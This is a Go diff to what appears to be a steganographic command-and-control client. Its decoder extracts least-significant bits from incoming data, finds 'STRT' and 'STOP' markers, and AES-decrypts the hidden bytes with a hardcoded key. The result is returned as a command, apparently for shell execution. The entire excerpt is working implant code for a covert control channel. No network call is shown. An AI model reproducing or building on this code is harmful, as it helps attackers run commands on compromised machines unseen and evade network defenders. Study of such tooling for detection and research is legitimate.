@@ -18,11 +18,6 @@ var key []byte = []byte{
     0x09, 0xcf, 0x4f, 0x3c,
 }
 
-var(
-	store_command int = 0
-	chunkStartCheck string = "true"
-)
-
 func encrypt(key, plaintext []byte) (string, error) {
     block, err := aes.NewCipher(key)
     if err != nil {
@@ -69,17 +64,23 @@ func decrypt(key, ciphertext []byte) (string, error) {
     return string(pt), err
 }
 
+var(
+	store_command int = 0
+	chunkStartCheck string = "true"
+	decoded_cmd_byte []byte
+
+)
+
 func decoderEngine(buf []byte) (string, string){
 
 	var current_decoded_byte byte
-	cmd_bitIndex := 0
-
-	var decoded_cmd_byte []byte
+	cmd_bitIndex :=0 
 	var fifo4 []byte
 	var finalCommand string = ""
 	var isFullMessage string = "false"
 	
 	if chunkStartCheck=="true"{
+		decoded_cmd_byte = decoded_cmd_byte[:0] //no pending STOP message
 		for _, stegd_byte := range(buf[:8*4]){ //if server has a command to send, the first 4 bytes would be STRT, unless it is a big command
 			lsb := stegd_byte & 1
 			current_decoded_byte = (current_decoded_byte << 1) | lsb
@@ -93,7 +94,7 @@ func decoderEngine(buf []byte) (string, string){
 		if "STRT"==string(fifo4){
 			chunkStartCheck="false" 	//big commands will be taken care, by not performing this chek, until a STOP is encountered
 		}else{
-			return  "", ""//dont bother decoding rest of the chunk
+			return  "", "none"//dont bother decoding rest of the chunk
 		}
 	}
 	fifo4 = fifo4[:0]
@@ -121,6 +122,7 @@ func decoderEngine(buf []byte) (string, string){
 				isFullMessage = "true"
 				store_command = 0
 				chunkStartCheck = "true"
+				//fmt.Println("Pre decryptio = ", decoded_cmd_byte)
 				finalCommand = strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
 
 				finalCommand , err:= decrypt(key, []byte(finalCommand))
@@ -128,7 +130,7 @@ func decoderEngine(buf []byte) (string, string){
 				
 				if err!=nil{
 					fmt.Println("Client decrypt error -", err)
-					return "echo 'decr err'", ""
+					return "echo 'decr err'", "decrErr"
 				}
 				decoded_cmd_byte = decoded_cmd_byte[:0]
 				//fmt.Println("$>", finalCommand)
